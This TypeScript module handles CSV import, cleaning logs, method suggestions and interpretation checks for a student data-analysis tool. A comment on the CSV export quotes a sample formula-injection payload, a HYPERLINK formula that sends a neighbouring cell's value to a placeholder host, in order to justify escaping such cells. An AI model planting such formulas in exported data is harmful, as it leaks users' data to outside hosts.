import { obj, textValue } from '../device-library';
import { describe, isNumeric, numbersIn, parseCsv, show, tally, type Summary, type Table } from '../stats';
import { gate, type Tier } from './classification';
import { causalWording } from './research';

/**
 * The Data Studio's rules: import through the classification gate, keep the
 * raw data untouched, log every cleaning step, describe with arithmetic, and
 * refuse a conclusion that does not say what it cannot conclude.
 *
 * ## Raw is raw
 *
 * A project holds the CSV exactly as it was imported and never writes to it.
 * Cleaning is a list of transformations replayed over the raw table each time
 * (`clean`), so the log *is* the cleaning — there is no cleaned copy that
 * could drift from the steps that supposedly produced it, and undoing a step
 * is deleting it from the list.
 *
 * ## The numbers come from `lib/stats.ts`
 *
 * Every statistic here is the same tested arithmetic the Analyse screen uses.
 * Nothing in this file asks a model for a number.
 */

export type ColumnType = 'number' | 'category' | 'text' | 'date';

export interface Column {
  name: string;
  type: ColumnType;
  unit: string;
  valid: string;
  source: string;
  missingRule: string;
  /** Suggested types are only suggestions until the student confirms them. */
  confirmed: boolean;
}

export type TransformKind = 'drop-missing' | 'drop-duplicates' | 'recode' | 'exclude-column' | 'trim';

export interface Transform {
  id: string;
  kind: TransformKind;
  column: string;
  from: string;
  to: string;
  /** Why — required, because a cleaning log without reasons cannot be defended. */
  note: string;
}

export interface Interpretation {
  shows: string;
  method: string;
  uncertainty: string;
  conclude: string;
  cannotConclude: string;
}

export interface DataProject {
  id: string;
  name: string;
  tier: Tier;
  /** The CSV as imported. Never modified. */
  raw: string;
  imported: string;
  dictionary: Column[];
  transforms: Transform[];
  randomized: boolean;
  interpretation: Interpretation;
}

export type ImportResult = { ok: true; project: DataProject } | { ok: false; reason: string; route?: string };

/*
 * Storage budget. Datasets live in localStorage, which one origin shares with
 * every other part of Semester — sign-in, threads, the other device
 * libraries. A toolkit that filled it would break those, and the failure
 * would land on whichever unrelated write came next. So the toolkit keeps
 * well inside the quota: one dataset's raw text at most `MAX_RAW`, and the
 * whole data library at most `DATA_BUDGET` characters once serialized
 * (JSON escaping can nearly double a CSV full of quotes and newlines, which
 * is why the budget is more than twice the per-file cap). Larger files
 * belong in Analyse data, which reads them without keeping a copy.
 */
export const MAX_RAW = 400_000;
export const DATA_BUDGET = 1_000_000;

export function importCsv(id: string, name: string, text: string, tier: Tier | undefined, now: Date): ImportResult {
  const verdict = gate(tier, 'store', false);
  if (!verdict.allowed) return { ok: false, reason: verdict.reason, route: verdict.route };
  if (!tier) return { ok: false, reason: 'Choose what kind of data this is before importing it.' };
  if (text.length > MAX_RAW) return { ok: false, reason: 'This file is larger than 400 KB. Import a smaller extract, or open the whole file in Analyse data.' };
  const table = parseCsv(text);
  if (!table.headers.length || !table.rows.length) return { ok: false, reason: 'No rows found. Check the file has a header row and data.' };
  return {
    ok: true,
    project: {
      id,
      name: name.trim() || 'Untitled dataset',
      tier,
      raw: text,
      imported: now.toISOString(),
      dictionary: suggestDictionary(table),
      transforms: [],
      randomized: false,
      interpretation: { shows: '', method: '', uncertainty: '', conclude: '', cannotConclude: '' },
    },
  };
}

export function suggestDictionary(table: Table): Column[] {
  return table.headers.map((name, i) => {
    const cells = table.rows.map((r) => r[i] ?? '').filter((c) => c.trim());
    const distinct = new Set(cells).size;
    const type: ColumnType = isNumeric(table, i)
      ? 'number'
      : cells.length && cells.every((c) => /^\d{4}-\d{2}-\d{2}/.test(c))
        ? 'date'
        : distinct <= Math.max(12, cells.length / 10)
          ? 'category'
          : 'text';
    return { name, type, unit: '', valid: '', source: '', missingRule: '', confirmed: false };
  });
}

export const unconfirmed = (p: DataProject) => p.dictionary.filter((c) => !c.confirmed).map((c) => c.name);

/** The working table: raw, with the logged transformations applied in order. */
export function clean(p: DataProject): Table {
  let table = parseCsv(p.raw);
  for (const t of p.transforms) {
    const i = table.headers.indexOf(t.column);
    if (t.kind === 'drop-duplicates') {
      const seen = new Set<string>();
      table = { ...table, rows: table.rows.filter((r) => (seen.has(r.join('\u0000')) ? false : (seen.add(r.join('\u0000')), true))) };
      continue;
    }
    if (i < 0) continue;
    if (t.kind === 'drop-missing') table = { ...table, rows: table.rows.filter((r) => (r[i] ?? '').trim() !== '') };
    else if (t.kind === 'trim') table = { ...table, rows: table.rows.map((r) => r.map((c, j) => (j === i ? c.trim() : c))) };
    else if (t.kind === 'recode') table = { ...table, rows: table.rows.map((r) => r.map((c, j) => (j === i && c.trim() === t.from.trim() ? t.to : c))) };
    else if (t.kind === 'exclude-column')
      table = { headers: table.headers.filter((_, j) => j !== i), rows: table.rows.map((r) => r.filter((_, j) => j !== i)) };
  }
  return table;
}

export type AddResult = { ok: true; project: DataProject } | { ok: false; reason: string };

export function addTransform(p: DataProject, t: Transform): AddResult {
  if (!t.note.trim()) return { ok: false, reason: 'Say why you are making this change. The log is how someone else can check it.' };
  if (t.kind !== 'drop-duplicates' && !parseCsv(p.raw).headers.includes(t.column)) return { ok: false, reason: 'Choose a column from the dataset.' };
  return { ok: true, project: { ...p, transforms: [...p.transforms, t] } };
}

export interface Described {
  column: string;
  numeric: Summary | null;
  counts: { value: string; count: number }[];
  missing: number;
}

export function describeColumn(table: Table, name: string): Described | null {
  const i = table.headers.indexOf(name);
  if (i < 0) return null;
  const cells = table.rows.map((r) => r[i] ?? '');
  const missing = cells.filter((c) => !c.trim()).length;
  if (isNumeric(table, i)) return { column: name, numeric: describe(numbersIn(table, i), missing), counts: [], missing };
  return { column: name, numeric: null, counts: tally(cells.filter((c) => c.trim())), missing };
}

/**
 * Alt text for a chart of one column, written from the computed numbers so it
 * says what the chart shows rather than that a chart exists.
 */
export function altText(d: Described): string {
  if (d.numeric) {
    const s = d.numeric;
    return `Distribution of ${d.column}: ${s.n} values${d.missing ? ` (${d.missing} missing)` : ''}, from ${show(s.min)} to ${show(s.max)}, median ${show(s.median)}, mean ${show(s.mean)}, standard deviation ${show(s.sd)}.`;
  }
  const top = d.counts.slice(0, 3).map((c) => `${c.value} (${c.count})`);
  return `Counts of ${d.column} across ${d.counts.length} categories${d.missing ? `, ${d.missing} missing` : ''}. Most common: ${top.join(', ') || 'none'}.`;
}

export type Outcome = 'number' | 'category';
export type Comparison = 'one-group' | 'two-groups' | 'three-plus-groups' | 'relationship';

export interface Method {
  name: string;
  when: string;
  assumptions: string[];
  ifAssumptionsFail: string;
}

/**
 * Methods that fit the design the student describes — always more than one,
 * with what each assumes. The brief rules out a blind "best test"; the choice
 * depends on things only the student and the course can judge (how the data
 * was collected, what the course has taught), so the guide lays the
 * candidates side by side and says what would rule each out.
 */
export function methodsFor(outcome: Outcome, comparison: Comparison, paired: boolean): Method[] {
  if (outcome === 'number') {
    if (comparison === 'one-group')
      return [
        { name: 'One-sample t-test', when: 'Compare a mean to a fixed value', assumptions: ['Independent observations', 'Roughly normal, or n ≥ 30'], ifAssumptionsFail: 'Wilcoxon signed-rank test' },
        { name: 'Confidence interval for the mean', when: 'Estimate the mean with its uncertainty', assumptions: ['Independent observations'], ifAssumptionsFail: 'Bootstrap interval' },
      ];
    if (comparison === 'two-groups')
      return paired
        ? [
            { name: 'Paired t-test', when: 'The same units measured twice', assumptions: ['Differences roughly normal', 'Pairs independent of each other'], ifAssumptionsFail: 'Wilcoxon signed-rank test' },
            { name: 'Mean difference with confidence interval', when: 'Report the size of the change', assumptions: ['Pairs independent'], ifAssumptionsFail: 'Bootstrap interval' },
          ]
        : [
            { name: 'Welch two-sample t-test', when: 'Two separate groups', assumptions: ['Independent groups', 'Roughly normal, or each group n ≥ 30', 'Does not assume equal variances'], ifAssumptionsFail: 'Mann–Whitney U test' },
            { name: 'Difference in means with effect size', when: 'Report how big the gap is', assumptions: ['Independent groups'], ifAssumptionsFail: 'Median difference' },
          ];
    if (comparison === 'three-plus-groups')
      return [
        { name: 'One-way ANOVA', when: 'Three or more separate groups', assumptions: ['Independent groups', 'Roughly normal residuals', 'Similar variances'], ifAssumptionsFail: 'Welch ANOVA or Kruskal–Wallis' },
        { name: 'Kruskal–Wallis test', when: 'Ranks rather than means', assumptions: ['Independent groups', 'Similar distribution shapes'], ifAssumptionsFail: 'Describe groups separately' },
      ];
    return [
      { name: 'Pearson correlation', when: 'Linear relationship between two numbers', assumptions: ['Roughly linear', 'No extreme outliers'], ifAssumptionsFail: 'Spearman rank correlation' },
      { name: 'Simple linear regression', when: 'Predict one number from another', assumptions: ['Linear', 'Independent residuals', 'Constant spread of residuals', 'Roughly normal residuals'], ifAssumptionsFail: 'Transform, or a robust or non-parametric model' },
    ];
  }
  if (comparison === 'one-group')
    return [{ name: 'Chi-square goodness of fit', when: 'Compare observed counts to expected proportions', assumptions: ['Independent observations', 'Expected count ≥ 5 per category'], ifAssumptionsFail: 'Exact binomial or multinomial test' }, { name: 'Proportion with confidence interval', when: 'Estimate one proportion', assumptions: ['Independent observations'], ifAssumptionsFail: 'Wilson interval for small samples' }];
  if (paired)
    return [{ name: 'McNemar test', when: 'The same units classified twice', assumptions: ['Paired yes/no outcomes'], ifAssumptionsFail: 'Exact McNemar test' }, { name: 'Difference in paired proportions', when: 'Report the size of the change', assumptions: ['Pairs independent'], ifAssumptionsFail: 'Exact interval' }];
  return [
    { name: 'Chi-square test of independence', when: 'Two categorical variables', assumptions: ['Independent observations', 'Expected count ≥ 5 per cell'], ifAssumptionsFail: 'Fisher’s exact test' },
    { name: 'Logistic regression', when: 'Model a yes/no outcome from predictors', assumptions: ['Independent observations', 'Enough events per predictor'], ifAssumptionsFail: 'Fewer predictors, or exact methods' },
  ];
}

/** What the interpretation is missing before it can be exported. Empty means complete. */
export function interpretationGaps(p: DataProject): string[] {
  const i = p.interpretation;
  const out: string[] = [];
  if (!i.shows.trim()) out.push('Say what the data shows, descriptively.');
  if (!i.method.trim()) out.push('Name the method and its assumptions.');
  if (!i.uncertainty.trim()) out.push('State the uncertainty — an interval, a p-value, a sensitivity check, or why none applies.');
  if (!i.conclude.trim()) out.push('Write the bounded conclusion.');
  if (!i.cannotConclude.trim()) out.push('Say what this data cannot show — every analysis has limits.');
  if (!p.randomized && causalWording(i.conclude))
    out.push('The conclusion uses causal wording, but the data is not from a randomized design. Say “is associated with” instead.');
  if (!p.randomized && causalWording(i.shows))
    out.push('“What the data shows” uses causal wording, but the data is not from a randomized design. Describe what was observed.');
  if (unconfirmed(p).length) out.push(`Confirm the dictionary for: ${unconfirmed(p).join(', ')}.`);
  return out;
}

/**
 * Whether one more dataset fits in the library's budget, measured the way it
 * will be stored.
 */
export const fits = (next: readonly DataProject[]) => JSON.stringify(next).length <= DATA_BUDGET;

/*
 * A cell a spreadsheet would read as a formula. `=`, `+`, `-` and `@` start
 * one in Excel, Sheets and LibreOffice, and a leading tab or carriage return
 * can hide one. `=HYPERLINK("http://x/?"&A2)` in a course dataset would send
 * the neighbouring cell to that address the moment the export is opened.
 */
const FORMULA = /^[=+\-@\t\r]/;

/**
 * CSV for a spreadsheet to open safely: formula-like cells are prefixed with
 * an apostrophe, which every spreadsheet shows as text, and any cell holding
 * a quote, comma or line break is quoted. A negative number loses nothing a
 * reader cares about — `'-3` displays as -3 — and the raw data, which is what
 * the analysis used, is untouched.
 */
export function toCsv(table: Table): string {
  const cell = (c: string) => {
    const safe = FORMULA.test(c) ? `'${c}` : c;
    return /[",\r\n]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
  };
  return [table.headers, ...table.rows].map((r) => r.map(cell).join(',')).join('\n');
}

export function methodsWriteUp(p: DataProject): string {
  const table = clean(p);
  const lines = [
    `Data: ${p.name}, imported ${p.imported.slice(0, 10)}. ${parseCsv(p.raw).rows.length} rows as imported; ${table.rows.length} after cleaning.`,
    p.transforms.length ? 'Cleaning steps, in order:' : 'No cleaning steps were applied.',
    ...p.transforms.map((t, n) => `${n + 1}. ${t.kind}${t.column ? ` on ${t.column}` : ''}${t.kind === 'recode' ? ` (“${t.from}” → “${t.to}”)` : ''}: ${t.note}`),
    '',
    `What the data shows: ${p.interpretation.shows}`,
    `Method: ${p.interpretation.method}`,
    `Uncertainty: ${p.interpretation.uncertainty}`,
    `What we can reasonably conclude: ${p.interpretation.conclude}`,
    `What we cannot conclude: ${p.interpretation.cannotConclude}`,
  ];
  return lines.join('\n');
}

const TIERS_OK = new Set(['T0', 'T1', 'T2', 'T3']);

export function readDataProjects(value: unknown): DataProject[] {
  if (!Array.isArray(value)) throw new Error('Data projects are not a list.');
  return value.map((p) => {
    if (!obj(p) || !textValue(p.id, 80) || !textValue(p.raw, MAX_RAW) || !TIERS_OK.has(p.tier as string))
      throw new Error('A data project is malformed.');
    const str = (v: unknown, max = 20_000) => (textValue(v, max) ? v : '');
    const interp = obj(p.interpretation) ? p.interpretation : {};
    return {
      id: p.id,
      name: str(p.name, 300) || 'Untitled dataset',
      tier: p.tier as Tier,
      raw: p.raw,
      imported: str(p.imported, 40),
      dictionary: Array.isArray(p.dictionary)
        ? p.dictionary.filter(obj).map((c) => ({
            name: str(c.name, 300),
            type: (['number', 'category', 'text', 'date'].includes(c.type as string) ? c.type : 'text') as ColumnType,
            unit: str(c.unit, 200),
            valid: str(c.valid, 2000),
            source: str(c.source, 2000),
            missingRule: str(c.missingRule, 2000),
            confirmed: c.confirmed === true,
          }))
        : [],
      transforms: Array.isArray(p.transforms)
        ? p.transforms.filter(obj).map((t) => ({
            id: str(t.id, 80),
            kind: (['drop-missing', 'drop-duplicates', 'recode', 'exclude-column', 'trim'].includes(t.kind as string) ? t.kind : 'trim') as TransformKind,
            column: str(t.column, 300),
            from: str(t.from, 2000),
            to: str(t.to, 2000),
            note: str(t.note, 5000),
          }))
        : [],
      randomized: p.randomized === true,
      interpretation: {
        shows: str(interp.shows),
        method: str(interp.method),
        uncertainty: str(interp.uncertainty),
        conclude: str(interp.conclude),
        cannotConclude: str(interp.cannotConclude),
      },
    };
  });
}
